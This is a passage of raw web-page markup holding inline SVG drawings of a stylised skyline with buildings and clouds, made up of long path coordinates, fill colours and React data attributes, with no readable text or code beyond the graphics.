6h45v2h-45zm0 6h45v2h-45zm0 6h45v2h-45zm0 6h45v2h-45z" data-reactid="79"></path><path fill="#FFF" d="M652.3 161.6c-1.2-1.2-3.3-.2-3.3 1.4v11l-12.7-12.4c-1.2-1.2-3.3-.2-3.3 1.4v11h-.1.1l-12.7-12.4c-1.2-1.2-3.3-.2-3.3 1.4v11l-12.7-12.4c-1.2-1.2-3.3-.3-3.3 1.4v37h64v-26l-12.7-12.4z" data-reactid="80"></path><path fill="#D6D6D5" d="M605 180h7v2h-7zm11 0h7v2h-7zm11 0h7v2h-7zm11 0h7v2h-7zm-33 6h7v2h-7zm11 0h7v2h-7zm11 0h7v2h-7zm11 0h7v2h-7zm-33 6h7v2h-7zm11 0h7v2h-7zm11 0h7v2h-7zm11 0h7v2h-7z" data-reactid="81"></path><path fill="#5879DA" d="M671 180h7v2h-7zm0 6h7v2h-7zm0 6h7v2h-7z" data-reactid="82"></path><path fill="#D6D6D5" d="M649 150h2v7h-2zm-8 0h2v7h-2zm-8 0h2v7h-2z" data-reactid="83"></path><path fill="#5879DA" d="M657 150h2v7h-2zm-8 0h2v7h-2zm-8 0h2v7h-2zm-8 0h2v7h-2z" data-reactid="84"></path><path fill="#D6D6D5" d="M641 137h2v7h-2zm-8 0h2v7h-2z" data-reactid="85"></path><path fill="#5879DA" d="M641 137h2v7h-2zm-8 0h2v7h-2zm0-13v7h2v-6l-1-1" data-reactid="86"></path><path fill="#D6D6D5" d="M649 124h2v7h-2zm-8 0h2v7h-2zm10 20l-2-2v-5h2" data-reactid="87"></path><path fill="#5879DA" d="M667 157h-2v-2" data-reactid="88"></path><pattern id="d" patternTransform="translate(-87 51)" data-reactid="89"></pattern><path fill="url(#d)" d="M231 151h41v49h-41z" data-reactid="90"></path><path fill="#5879DA" d="M651 144h-2v-5l2 2" data-reactid="91"></path><path fill="#89DAC1" d="M346.5 189h-10c-1.9 0-3.5-1.6-3.5-3.5s1.6-3.5 3.5-3.5h1.1c.9 0 1.8-.4 2.4-1 .6-.6 1.5-1 2.4-1h4.1c2.5 0 4.5 2 4.5 4.5s-2 4.5-4.5 4.5zM476 178.5c0-1.9 1.6-3.5 3.5-3.5 1.6 0 3.1-.6 4.3-1.8l.2-.2c1.3-1.3 3-2 4.8-2h7.7c3 0 5.5 2.5 5.5 5.5s-2.5 5.5-5.5 5.5h-17c-1.9 0-3.5-1.6-3.5-3.5zm88.5 10.5H576c1.7 0 3-1.3 3-3s-1.3-3-3-3h-.9c-1.4 0-2.6-.5-3.6-1.5s-2.3-1.5-3.6-1.5h-3.4c-2.5 0-4.4 2-4.4 4.5-.1 2.5 1.9 4.5 4.4 4.5z" data-reactid="92"></path><path fill="#D6D6D5" d="M635 125l-1-1h1" data-reactid="93"></path><path fill="#FFF" d="M727 53h-24c-11.1 0-20 8.9-20 20v127h44V53z" data-reactid="94"></path><path fill="#D6D6D5" d="M700 61h2v57h-2zm7 0h2v57h-2zm9 63l-2-2V61h2m7 70l-2-2V61h2" data-reactid="95"></path><path fill="#D6D6D5" d="M750 53h-23v81l-16-16h-28v82h67" data-reactid="96"></path><path fill="#5879DA" d="M716 154h-2v-33l2 2m7 31h-2v-26l2 2m-17-6h2v7h-2zm-8 0h2v7h-2zm-8 0h2v7h-2zm16 13h2v7h-2zm-8 0h2v7h-2zm-8 0h2v7h-2zm16 13h2v7h-2zm-8 0h2v7h-2zm-8 0h2v7h-2zm20 32v2c0 1.3-.9 2.5-1.7 3.3l-2 2-.3.3V182h-2v18h2v-5c0-1.3.8-3.4 1.7-4.3l2-2c1-1 2.3-2.7 2.3-4.7v-2h-2z" data-reactid="97"></path><path fill="#FFF" d="M694 178.6c0-1.9 1.6-3.4 3.5-3.4h1.2c.9 0 1.8-.4 2.5-1l2.2-2.1c.7-.6 1.5-1 2.5-1h8.6c3.1 0 5.6 2.5 5.6 5.5s-2.5 5.5-5.6 5.5h-16.9c-2-.1-3.6-1.6-3.6-3.5z" data-reactid="98"></path><path fill="#5879DA" d="M734 189h2v11h-2z" data-reactid="99"></path><path fill="#FFF" d="M729.5 189H741c1.7 0 3-1.3 3-3s-1.3-3-3-3h-.9c-1.4 0-2.6-.5-3.6-1.5s-2.3-1.5-3.6-1.5h-3.4c-2.5 0-4.4 2-4.4 4.5-.1 2.5 1.9 4.5 4.4 4.5z" data-reactid="100"></path><path fill="#5879DA" d="M734 61h2v93h-2zm7 0h2v93h-2z" data-reactid="101"></path><path d="M202 200h-21.2c4 0 7.8-1.6 10.6-4.4L202 185v15zm-117.5-4.4l-17.8-17.8c-5.6-5.6-13.3-8.8-21.2-8.8H0v31h95.1c-4 0-7.8-1.6-10.6-4.4z" data-reactid="102"></path><path fill="#89DAC1" d="M660 29h13V16c-6.9 0-13 6.1-13 13z" data-reactid="103"></path></svg></div><div class="visible--lap" data-reactid="104"><svg style="display:block;max-width:100%;margin:0 auto;" data-name="Layer 1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 768 96" height="96" width="768" preserveAspectRatio="xMinYMax meet" data-reactid="105"><defs data-reactid="106"><pattern id="a" data-name="2 3 - black" width="5" height="5" patternTransform="matrix(.5 0 0 -.5 359.2 185.8)" patternUnits="userSpaceOnUse" viewBox="0 0 5 5" data-reactid="107"><path fill="none" d="M0 0h5v5H0z" data-reactid="108"></path><path fill="none" d="M0 0h5v5H0z" data-reactid="109"></path><path fill="none" d="M0 0h5v5H0z" data-reactid="110"></path><path fill="none" d="M0 5h5V0H0v5z" data-reactid="111"></path><path d="M2 3H0v2h2V3z" data-reactid="112"></path></pattern><pattern id="b" data-name="SVGID 1" width="5" height="5" patternTransform="matrix(.5 0 0 -.5 416 51.8)" patternUnits="userSpaceOnUse" viewBox="0 0 5 5" data-reactid="113"><path fill="none" d="M0 0h5v5H0z" data-reactid="114"></path><path fill="none" d="M0 0h5v5H0z" data-reactid="115"></path><path fill="none" d="M0 0h5v5H0z" data-reactid="116"></path><path fill="none" d="M0 5h5V0H0v5z" data-reactid="117"></path><path d="M2 3H0v2h2V3z" data-reactid="118"></path></pattern><pattern id="c" data-name="2 3 - black-3" width="5" height="5" patternTransform="matrix(.5 0 0 -.5 359.3 185.8)" patternUnits="userSpaceOnUse" viewBox="0 0 5 5" data-reactid="119"><path fill="none" d="M0 0h5v5H0z" data-reactid="120"></path><path fill="none" d="M0 0h5v5H0z" data-reactid="121"></path><path fill="none" d="M0 0h5v5H0z" data-reactid="122"></path><path fill="none" d="M0 5h5V0H0v5z" data-reactid="123"></path><path d="M2 3H0v2h2V3z" data-reactid="124"></path></pattern></defs><path d="M737.59 26.59h-67.31a2.71 2.71 0 0 1 0-5.42h24.91a11.78 11.78 0 0 0 8.32-3.45 11.78 11.78 0 0 1 8.32-3.45h9.52A95.87 95.87 0 0 0 671.82.49H559.75A22.9 22.9 0 0 0 544 6.4a24.35 24.35 0 0 1-16.15 6.4h-50.36a42.36 42.36 0 0 0-29 10.83 44.16 44.16 0 0 1-29.55 11.36h-64.48a67.8 67.8 0 0 0-46.28 18.22c-12.85 12-30.42 18.71-48.69 18.71h-8.42a50.62 50.62 0 0 0-34.46 13.79l-12.79 11.28H768a96.09 96.09 0 0 0-30.41-70.4zm-99.06 5.91a8.37 8.37 0 1 1 8.41-8.38 8.37 8.37 0 0 1-8.37 8.37zm79.75 16.74h-55.14a2.46 2.46 0 0 1 0-4.92h7.53a15 15 0 0 0 10.68-4.43 15.09 15.09 0 0 1 10.68-4.43h26.24a6.89 6.89 0 0 1 .01 13.78z" fill="#1A3177" data-reactid="125"></path><path d="M756.19 85.18a72.86 72.86 0 0 0-51.25-21.19h-54.6v33H768zM454.4 74.84h-8.37V56.13a36.37 36.37 0 0 0 8.37-1v19.7zm133.42-39.39a61.85 61.85 0 0 1 44.31 18.32v21.56h-44.31V35.45zm-84.68-.49v6.89l-6.89-6.89h6.89zM282.59 96.99h-22.16a38 38 0 0 0 22.15-7.39v7.39z" data-reactid="126"></path><path fill="#fff" d="M413.54 15.76v4.43h-4.92V97h23.63V20.68h2.46v-4.92h-21.17zm56.61 59.08h-32.98L459.32 97h10.83V74.84z" data-reactid="127"></path><path fill="#fff" d="M454.4 44.81h15.75v30.04H454.4z" data-reactid="128"></path><path fill="#d6d6d6" d="M456.86 48.25h13.29v.98h-13.29zm0 2.96h13.29v.98h-13.29zm0 2.95h13.29v.98h-13.29zm0 2.96h13.29v.98h-13.29zm0 2.95h13.29v.98h-13.29zm0 2.96h13.29v.98h-13.29zm0 2.95h13.29v.98h-13.29zm0 2.95h13.29v.98h-13.29z" data-reactid="129"></path><path fill="#fff" d="M458.83 41.85h17.72v2.95h-17.72z" data-reactid="130"></path><path fill="#89DAC1" d="M458.83 41.85l9.35-9.35h8.37v9.35h-17.72z" data-reactid="131"></path><path fill="#5879DA" d="M503.14 41.85l-9.36-9.35h-17.23v9.35h26.59z" data-reactid="132"></path><path fill="#89DAC1" d="M481.97 38.9v-2.96h-2.96l2.96 2.96zm6.4 0v-2.96h-2.95l2.95 2.96zm6.4 0v-2.96h-2.96l2.96 2.96z" data-reactid="133"></path><path fill="#fff" d="M468.18 31.02h8.37v1.48h-8.37zm51.2 52.69l-27.07-27.09h27.07v27.09z" data-reactid="134"></path><path fill="#d6d6d6" d="M514.46 59.58h.98v3.45h-.98zm-3.94 0h.98v3.45h-.98zm-3.94 0h.98v3.45h-.98zm7.88 6.4h.98v3.45h-.98zm-3.94 0h.98v3.45h-.98zm-3.94 0h.98v3.45h-.98zm7.88 6.4h.98v3.45h-.98zm-6.89.49l-.49-.49h.49v.49zm3.94 2.96h-.5l-.49-.5v-2.95h.99v3.45z" data-reactid="135"></path><path fill="#5879DA" d="M334.28 68.93h10.34v3.94h-10.34zm0-6.89h10.34v3.94h-10.34zm0-6.89h10.34v3.94h-10.34zm0-6.9v3.94h11.81l-3.94-3.94h-7.87z" data-reactid="136"></path><path fill="#d6d6d6" d="M334.28 65.98h10.34v2.95h-10.34zm0-6.89h10.34v2.95h-10.34zm0-6.9h8.37v2.95h-8.37z" data-reactid="137"></path><path fill="#89DAC1" d="M334.28 68.93v3.94H307.2l3.94-3.94h23.14zm0-6.89v3.94h-21.66l3.93-3.94h17.73zm0-6.89v3.94h-17.23l3.93-3.94h13.3zm0-6.9v3.94h-12.31l3.94-3.94h8.37z" data-reactid="138"></path><path fill="#fff" d="M316.55 65.98h17.72v2.95h-17.72zm4.43-6.89h13.29v2.95h-13.29zm4.93-6.9h8.37v2.95h-8.37zm312.12 42.84l-19.69-19.7h-4.93V56.62h24.62v38.41z" data-reactid="139"></path><path fill="#5879DA" d="M638.03 52.69v3.93h12.8l-3.94-3.93h-8.86z" data-reactid="140"></path><path fill="#89DAC1" d="M638.03 52.69v3.93h-24.62l4.14-3.93h20.48z" data-reactid="141"></path><path fill="#d6d6d6" d="M635.08 59.09h.98v3.45h-.98zm-3.94 0h.98v3.45h-.98zm-3.94 0h.98v3.45h-.98zm-3.94 0h.98v3.45h-.98zm-3.94 0h.98v3.45h-.98zm-3.94 0h.98v3.45h-.98zm19.7 6.4h.98v3.45h-.98zm-3.94 0h.98v3.45h-.98zm-3.94 0h.98v3.45h-.98zm-3.94 0h.98v3.45h-.98zm-3.94 0h.98v3.45h-.98zm-3.94 0h.98v3.45h-.98zm19.7 6.4h.98v3.45h-.98zm-3.94 0h.98v3.45h-.98zm-3.94 0h.98v3.45h-.98zm-3.94 0h.98v3.45h-.98zm-3.94 0h.98v3.45h-.98zm-3.94 0h.98v3.45h-.98zm-243.2 7.88h36.43V97h-36.43z" data-reactid="142"></path><path fill="url(#a)" d="M372.18 79.77h36.43V97h-36.43z" data-reactid="143"></path><path d="M372.19 15.75v23.64h-8.37v3h-12.31a6.89 6.89 0 0 0-6.89 6.89v47.71h27.57V42.34h15.75V-.01zm104.36 8.38h.98v6.89h-.98z" fill="#fff" data-reactid="144"></path><path fill="#5879DA" d="M477.54 24.13h2.95v.98h-2.95z" data-reactid="145"></path><path fill="#fff" d="M484.92 24.13h.98v6.89h-.98z" data-reactid="146"></path><path fill="#5879DA" d="M485.91 24.13h2.95v.98h-2.95z" data-reactid="147"></path><path fill="#fff" d="M492.8 24.13h.98v6.89h-.98z" data-reactid="148"></path><path fill="#5879DA" d="M493.78 24.13h2.95v.98h-2.95z" data-reactid="149"></path><path fill="#d6d6d6" d="M368.74 82.23h.98v3.45h-.98zm-3.94 0h.98v3.45h-.98zm-3.94 0h.98v3.45h-.98zm7.88 6.4h.98v3.45h-.98zm-3.94 0h.98v3.45h-.98zm-3.94 0h.98v3.45h-.98zm76.31-13.79h8.86V20.68h-2.46v-4.92h-8.86v4.92h-2.46V97h27.07l-22.15-22.16z" data-reactid="150"></path><path fill="url(#b)" d="M296.86 72.87h20.18V97h-20.18z" data-reactid="151"></path><path fill="#d6d6d6" d="M296.86 72.87V97h47.76V72.87h-47.76zM413.54 8.86h.98v6.89h-.98zm2.95 0h.98v6.89h-.98z" data-reactid="152"></path><path d="M514.46 6.4a6.59 6.59 0 0 0-6.4 6.4h12.8a6.59 6.59 0 0 0-6.4-6.4z" fill="#89DAC1" data-reactid="153"></path><path d="M514.46 6.4v6.4h6.4a6.59 6.59 0 0 0-6.4-6.4z" fill="#5879DA" data-reactid="154"></path><path fill="#fff" d="M515.45 54.66V14.28h-.99V12.8h-9.84v1.48h-1.48v40.38h12.31z" data-reactid="155"></path><path fill="#d6d6d6" d="M512.49 16.74h.98v3.45h-.98zm0 5.42h.98v3.45h-.98zm0 5.41h.98v3.45h-.98zm0 5.42h.98v3.45h-.98zm0 5.42h.98v3.45h-.98zm-2.46-21.67h.98v3.45h-.98zm0 5.42h.98v3.45h-.98zm0 5.41h.98v3.45h-.98zm0 5.42h.98v3.45h-.98zm0 5.42h.98v3.45h-.98zm-2.46-21.67h.98v3.45h-.98zm0 5.42h.98v3.45h-.98zm0 5.41h.98v3.45h-.98zm0 5.42h.98v3.45h-.98zm0 5.42h.98v3.45h-.98zm-2.46-21.67h.98v3.45h-.98zm0 5.42h.98v3.45h-.98zm0 5.41h.98v3.45h-.98zm0 5.42h.98v3.45h-.98zm0 5.42h.98v3.45h-.98z" data-reactid="156"></path><path fill="#fff" d="M562.22 18.71h12.8v49.24h-12.8z" data-reactid="157"></path><path d="M587.82 67.99h-12.8V18.71a12.8 12.8 0 0 1 12.8 12.8v36.48z" fill="#d6d6d6" data-reactid="158"></path><path fill="#fff" d="M552.86 75.34h30.03V97h-30.03z" data-reactid="159"></path><path fill="#d6d6d6" d="M582.89 75.34h35.45V97h-35.45z" data-reactid="160"></path><path d="M590.28 81.73a1.48 1.48 0 0 0-1.48 1.48v13.78h3V83.21a1.48 1.48 0 0 0-1.52-1.48zm6.89 0a1.48 1.48 0 0 0-1.48 1.48v13.78h3V83.21a1.48 1.48 0 0 0-1.52-1.48zm6.89 0a1.48 1.48 0 0 0-1.48 1.48v13.78h3V83.21a1.48 1.48 0 0 0-1.52-1.48zm6.88 0a1.48 1.48 0 0 0-1.48 1.48v13.78h3V83.21a1.48 1.48 0 0 0-1.52-1.48z" fill="#5879DA" data-reactid="161"></path><path d="M563.69 81.73a1.48 1.48 0 0 0-1.48 1.48v13.78h3V83.21a1.48 1.48 0 0 0-1.52-1.48zm6.9 0a1.48 1.48 0 0 0-1.48 1.48v13.78h3V83.21a1.48 1.48 0 0 0-1.52-1.48zm6.89 0a1.48 1.48 0 0 0-1.48 1.48v13.78h3V83.21a1.48 1.48 0 0 0-1.52-1.48z" fill="#d6d6d6" data-reactid="162"></path><path d="M357.94 79.76v-2h2.46a8.56 8.56 0 0 0 5.91-2.46l1-1h4.92v5.42h-14.29z" fill="#89DAC1" data-reactid="163"></path><path d="M408.62 79.76v-2h-2a9.44 9.44 0 0 1-6.4-2.46l-1-1h-27.03v5.42h36.43zm174.32-4.43h35.4a24.7 24.7 0 0 0-17.72-7.34 25 25 0 0 0-17.68 7.34z" fill="#5879DA" data-reactid="164"></path><path fill="#d6d6d6" d="M640 97l-21.66-21.67V97H640zm-77.78-63.52h12.8v.98h-12.8zm0 2.96h12.8v.98h-12.8zm0 2.95h12.8v.98h-12.8zm0 2.96h12.8v.98h-12.8zm0 2.95h12.8v.98h-12.8zm0 2.95h12.8v.98h-12.8zm0 2.96h12.8v.98h-12.8zm0 2.95h12.8v.98h-12.8z" data-reactid="165"></path><path fill="#5879DA" d="M575.02 33.48h12.8v.98h-12.8zm0 2.96h12.8v.98h-12.8zm0 2.95h12.8v.98h-12.8zm0 2.96h12.8v.98h-12.8zm0 2.95h12.8v.98h-12.8zm0 2.95h12.8v.98h-12.8zm0 2.96h12.8v.98h-12.8zm0 2.95h12.8v.98h-12.8z" data-reactid="166"></path><path d="M575.08 18.72v12.8h12.8a12.84 12.84 0 0 0-12.8-12.8z" transform="translate(-.1)" fill="url(#c)" data-reactid="167"></path><path fill="#d6d6d6" d="M657.23 79.77h17.23V97h-17.23z" data-reactid="168"></path><path fill="url(#a)" d="M657.23 79.77h17.23V97h-17.23z" data-reactid="169"></path><path fill="#89DAC1" d="M657.23 79.77h-12.8l6.4-6.41 6.4 6.41z" data-reactid="170"></path><path fill="#5879DA" d="M668.06 73.36h-17.23l6.4 6.41h17.23l-6.4-6.41zM425.35 88.13v1a2.49 2.49 0 0 1-.84 1.62l-1 1-.15.15v-3.77h-1v8.86h1v-2.7a3.1 3.1 0 0 1 .84-1.87l1-1a3.45 3.45 0 0 0 1.13-2.31v-1h-1zm37.91 3.45h.98V97h-.98zm-111.75 0h.98V97h-.98z" data-reactid="171"></path><path fill="#d6d6d6" d="M476.55 31.02h17.23v1.48h-17.23z" data-reactid="172"></path><path d="M241.23 96.99a20.89 20.89 0 0 1-15-6.35 26.49 26.49 0 0 0-18.46-7.93h-18.72a14.05 14.05 0 0 1-10.34-3.94 15.65 15.65 0 0 0-10.83-4.43h-39.39a20.24 20.24 0 0 1-14.28-5.91 20.24 20.24 0 0 0-14.27-5.9H49.23a35.59 35.59 0 0 0-25.11 10.34L0 96.99h241.23z" data-reactid="173"></path><path d="M638.52 13.29a10.83 10.83 0 1 0 10.83 10.83 10.83 10.83 0 0 0-10.83-10.83zm0 19.2a8.37 8.37 0 1 1 8.42-8.37 8.37 8.37 0 0 1-8.37 8.37z" fill="#1A3177" data-reactid="174"></path><path fill="#5879DA" d="M318.52 74.35v15.76h.99V75.33l-.99-.98zm3.94 3.94v11.82h.99V79.27l-.99-.98zm3.94 3.94v7.88h.98v-6.9l-.98-.98zm3.94 3.94v3.94h.98v-2.96l-.98-.98z" data-reactid="175"></path><path d="M296.86 72.87h-8.76a5.5 5.5 0 0 0-5.51 5.5v18.62h14.28V72.87z" fill="#fff" data-reactid="176"></path><path fill="#5879DA" d="M337.23 74.35h.98v15.76h-.98zm3.45 0h.98v15.76h-.98zm94.03-50.72h3.45v.98h-3.45zm5.41 0h3.45v.98h-3.45zm-5.41 2.96h3.45v.98h-3.45zm5.41 0h3.45v.98h-3.45zm-5.41 2.95h3.45v.98h-3.45zm5.41 0h3.45v.98h-3.45zm-5.41 2.96h3.45v.98h-3.45zm5.41 0h3.45v.98h-3.45zm-5.41 2.95h3.45v.98h-3.45zm5.41 0h3.45v.98h-3.45zm-5.41 2.96h3.45v.98h-3.45zm5.41 0h3.45v.98h-3.45zm-5.41 2.95h3.45v.98h-3.45zm5.41 0h3.45v.98h-3.45zm-5.41 2.95h3.45v.98h-3.45zm5.41 0h3.45v.98h-3.45zm-5.41 2.96h3.45v.98h-3.45zm5.41 0h3.45v.98h-3.45zm-5.41 2.95h3.45v.98h-3.45zm5.41 0h3.45v.98h-3.45zm-5.41 2.96h3.45v.98h-3.45zm5.41 0h3.45v.98h-3.45zm-5.41 2.95h3.45v.98h-3.45zm5.41 0h3.45v.98h-3.45zm-5.41 2.96h3.45v.98h-3.45zm5.41 0h3.45v.98h-3.45zm-5.41 2.95h3.45v.98h-3.45zm5.41 0h3.45v.98h-3.45zm-5.41 2.95h3.45v.98h-3.45zm5.41 0h3.45v.98h-3.45zm-5.41 2.96h3.45v.98h-3.45zm5.41 0h3.45v.98h-3.45zm-5.41 2.95h3.45v.98h-3.45zm5.41 0h3.45v.98h-3.45zm112.74-2.95h9.35v7.39h-9.35z" data-reactid="177"></path><path d="M600.62 67.99h-38.4v7.39h20.72a25 25 0 0 1 17.68-7.39z" fill="#89DAC1" data-reactid="178"></path><path fill="#d6d6d6" d="M657.23 85.18h-6.4V56.62h-12.8V97h19.2V85.18z" data-reactid="179"></path><path fill="#5879DA" d="M647.88 59.09h.98v3.45h-.98zm-3.94 0h.98v3.45h-.98zm-3.94 0h.98v3.45H640zm7.88 6.4h.98v3.45h-.98zm-3.94 0h.98v3.45h-.98zm-3.94 0h.98v3.45H640zm7.88 6.4h.98v3.45h-.98zm-3.94 0h.98v3.45h-.98zm-3.94 0h.98v3.45H640z" data-reactid="180"></path><path d="M406.65 77.79h2V56.13h-5.91v20.86a10.11 10.11 0 0 0 3.91.8z" data-reactid="181"></path><path d="M400.25 75.33a8.15 8.15 0 0 0 2.12 1.48h.34V-.01h-14.77v42.35h-15.75v32h27.08zm-48.74-29.54h20.68v.98h-20.68zm0 2.96h20.68v.98h-20.68zm0 2.95h20.68v.98h-20.68zm0 2.95h20.68v.98h-20.68zm0 2.96h20.68v.98h-20.68zm0 2.95h20.68v.98h-20.68zm0 2.96h20.68v.98h-20.68zm0 2.95h20.68v.98h-20.68z" fill="#d6d6d6" data-reactid="182"></path><path fill="#5879DA" d="M372.18 45.79h16.74v.98h-16.74zm0 2.96h16.74v.98h-16.74zm0 2.95h16.74v.98h-16.74zm0 2.95h16.74v.98h-16.74zm0 2.96h16.74v.98h-16.74zm0 2.95h16.74v.98h-16.74zm0 2.96h16.74v.98h-16.74zm0 2.95h16.74v.98h-16.74zM391.88 0h.98v67.46h-.98zm2.95 0h.98v67.46h-.98zm2.95 0h.98v67.46h-.98z" data-reactid="183"></path><path fill="#fff" d="M317.05 72.87h17.23v17.24l-17.23-17.24z" data-reactid="184"></path><path fill="#d6d6d6" d="M319.51 75.33v-.98h-.99l.99.98zm3.94 3.94v-4.92h-.99v3.94l.99.98zm3.93 3.94v-8.86h-.98v7.88l.98.98zm3.94 3.94v-12.8h-.98v11.82l.98.98z" data-reactid="185"></path><path d="M552.86 35.45h9.35v32.5h-9.35z" data-reactid="186"></path><path fill="#d6d6d6" d="M522.83 14.28V12.8h-8.37v1.48h.99v39.39l-8.87-8.86h-3.44v-2.96h-26.59v2.96h-6.4V97h49.23V83.71l-27.07-27.09h32V14.28h-1.48z" data-reactid="187"></path><path fill="#5879DA" d="M521.85 16.74h.98v3.45h-.98zm0 5.42h.98v3.45h-.98zm-2.47-5.42h.98v3.45h-.98zm0 5.42h.98v3.45h-.98zm-2.46-5.42h.98v3.45h-.98zm0 5.42h.98v3.45h-.98zm-46.77 26.09h36.43v.98h-36.43zm0 2.96h36.43v.98h-36.43zm0 2.95h36.43v.98h-36.43zm0 2.96h22.15v.98h-22.15zm0 2.95h22.15v.98h-22.15zm0 2.96h22.15v.98h-22.15zm0 2.95h22.15v.98h-22.15zm0 2.95h22.15v.98h-22.15z" data-reactid="188"></path><path d="M504.27 78.09a1 1 0 0 0-1.62.69v5.42l-6.25-6.11a1 1 0 0 0-1.62.69v5.42l-6.25-6.11a1 1 0 0 0-1.62.69v5.42l-6.27-6.11a1 1 0 0 0-1.62.69v18.21h31.51V84.2z" fill="#fff" data-reactid="189"></path><path fill="#d6d6d6" d="M480.98 87.15h3.45v.98h-3.45zm5.42 0h3.45v.98h-3.45zm5.42 0h3.45v.98h-3.45zm5.41 0h3.45v.98h-3.45zm-16.25 2.96h3.45v.98h-3.45zm5.42 0h3.45v.98h-3.45zm5.42 0h3.45v.98h-3.45zm5.41 0h3.45v.98h-3.45zm-16.25 2.95h3.45v.98h-3.45zm5.42 0h3.45v.98h-3.45zm5.42 0h3.45v.98h-3.45zm5.41 0h3.45v.98h-3.45z" data-reactid="190"></path><path fill="#5879DA" d="M513.48 87.15h3.45v.98h-3.45zm0 2.96h3.45v.98h-3.45zm0 2.95h3.45v.98h-3.45z" data-reactid="191"></path><path fill="#d6d6d6" d="M502.65 72.38h.98v3.45h-.98zm-3.94 0h.98v3.45h-.98zm-3.94 0h.98v3.45h-.98z" data-reactid="192"></path><path fill="#5879DA" d="M506.58 72.38h.98v3.45h-.98zm-3.93 0h.98v3.45h-.98zm-3.94 0h.98v3.45h-.98zm-3.94 0h.98v3.45h-.98z" data-reactid="193"></path><path fill="#d6d6d6" d="M498.71 65.98h.98v3.45h-.98zm-3.94 0h.98v3.45h-.98z" data-reactid="194"></path><path fill="#5879DA" d="M498.71 65.98h.98v3.45h-.98zm-3.94 0h.98v3.45h-.98zm0-6.4v3.44h.98v-2.95l-.49-.49h-.49z" data-reactid="195"></path><path fill="#d6d6d6" d="M502.65 59.58h.98v3.45h-.98zm-3.94 0h.98v3.45h-.98zm4.92 9.85l-.98-.99v-2.46h.98v3.45z" data-reactid="196"></path><path fill="#5879DA" d="M511.51 75.83h-.99v-.99l.99.99z" data-reactid="197"></path><path fill="url(#a)" d="M296.86 72.87h20.18V97h-20.18z" data-reactid="198"></path><path fill="#fff" d="M657.23 79.77h-12.8l12.8 12.8v-12.8z" data-reactid="199"></path><path fill="#89DAC1" d="M657.23 79.77h-12.8l6.4-6.41 6.4 6.41z" data-reactid="200"></path><path fill="#d6d6d6" d="M654.28 81.74h.98v3.45h-.98zm-3.94 0h.98v3.45h-.98z" data-reactid="201"></path><path d="M636.55 96.99a13.32 13.32 0 0 0 8.86-3.45 13.78 13.78 0 0 1 9.85-3.94h9.85a8.78 8.78 0 0 0 5.91-2.46 13.17 13.17 0 0 1 4.45-2.46v12.31h-38.92z" data-reactid="202"></path><path fill="#5879DA" d="M503.63 69.43h-.98v-2.47l.98.99v1.48z" data-reactid="203"></path><path d="M353.72 91.58h-4.92a1.74 1.74 0 0 1-1.72-1.72 1.74 1.74 0 0 1 1.72-1.72h.54a1.72 1.72 0 0 0 1.18-.49 1.72 1.72 0 0 1 1.18-.49h2a2.21 2.21 0 0 1 2.22 2.2 2.21 2.21 0 0 1-2.2 2.22zm63.76-5.17a1.74 1.74 0 0 1 1.72-1.72 3 3 0 0 0 2.12-.89l.1-.1a3.31 3.31 0 0 1 2.36-1h3.79a2.73 2.73 0 0 1 2.71 2.71 2.73 2.73 0 0 1-2.71 2.71h-8.37a1.74 1.74 0 0 1-1.72-1.71zm43.57 5.17h5.66a1.48 1.48 0 0 0 1.48-1.48 1.48 1.48 0 0 0-1.48-1.48h-.44a2.42 2.42 0 0 1-1.77-.74 2.5 2.5 0 0 0-1.77-.74h-1.67a2.17 2.17 0 0 0-2.17 2.17 2.14 2.14 0 0 0 2.05 2.27h.11z" fill="#89DAC1" data-reactid="204"></path><path fill="#d6d6d6" d="M495.75 60.07l-.49-.49h.49v.49z" data-reactid="205"></path><path d="M541.05 24.62h-11.82a9.81 9.81 0 0 0-9.85 9.78v62.59h21.66V24.62z" fill="#fff" data-reactid="206"></path><path fill="#d6d6d6" d="M527.75 28.56h.98v28.07h-.98zm3.45 0h.98v28.07h-.98zm4.43 31.02l-.98-.99V28.56h.98v31.02zm3.45 3.44l-.99-.98V28.56h.99v34.46z" data-reactid="207"></path><path fill="#d6d6d6" d="M552.86 75.33V24.62h-11.81V64.5l-7.88-7.88h-13.79V97h55.14l-21.66-21.67z" data-reactid="208"></path><path fill="#5879DA" d="M535.63 74.35h-.98V58.1l.98.99v15.26zm3.45 0h-.99v-12.8l.99.98v11.82zm-8.37-14.77h.98v3.45h-.98zm-3.94 0h.98v3.45h-.98zm-3.94 0h.98v3.45h-.98zm7.88 6.4h.98v3.45h-.98zm-3.94 0h.98v3.45h-.98zm-3.94 0h.98v3.45h-.98zm7.88 6.4h.98v3.45h-.98zm-3.94 0h.98v3.45h-.98zm-3.94 0h.98v3.45h-.98zm9.85 15.75v1a2.49 2.49 0 0 1-.84 1.62l-1 1-.15.15v-3.77h-1v8.86h1v-2.45a3.66 3.66 0 0 1 .84-2.12l1-1a3.45 3.45 0 0 0 1.13-2.31v-1h-1z" data-reactid="209"></path><path d="M524.8 86.46a1.7 1.7 0 0 1 1.72-1.67h.59a2 2 0 0 0 1.23-.49l1.08-1a1.84 1.84 0 0 1 1.23-.49h4.29a2.74 2.74 0 0 1 2.76 2.71 2.74 2.74 0 0 1-2.76 2.66h-8.32a1.79 1.79 0 0 1-1.82-1.72z" fill="#fff" data-reactid="210"></path><path fill="#5879DA" d="M544.49 91.58h.98V97h-.98z" data-reactid="211"></path><path d="M542.28 91.58h5.66a1.48 1.48 0 0 0 1.48-1.48 1.48 1.48 0 0 0-1.48-1.47h-.44a2.42 2.42 0 0 1-1.77-.74 2.5 2.5 0 0 0-1.77-.74h-1.67a2.17 2.17 0 0 0-2.17 2.17 2.14 2.14 0 0 0 2.05 2.22h.11z" fill="#fff" data-reactid="212"></path><path fill="#5879DA" d="M544.49 28.56h.98v45.79h-.98zm3.45 0h.98v45.79h-.98z" data-reactid="213"></path><path d="M638.58 8.38a15.76 15.76 0 1 0 15.75 15.76 15.76 15.76 0 0 0-15.75-15.76zm0 24.13a8.37 8.37 0 1 1 8.42-8.38 8.37 8.37 0 0 1-8.37 8.37z" transform="translate(-.1)" fill="url(#c)" data-reactid="214"></path></svg></div><div class="visible--desk-and-up" data-reactid="215"><svg style="display:block;max-width:100%;margin:0 auto;" data-name="Layer 1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1560 197" height="197" width="1560" preserveAspectRatio="xMinYMax meet" data-reactid="216"><defs data-reactid="217"><pattern id="a" data-name="2 3 - black" width="5" height="5" patternTransform="translate(726 27)" patternUnits="userSpaceOnUse" viewBox="0 0 5 5" 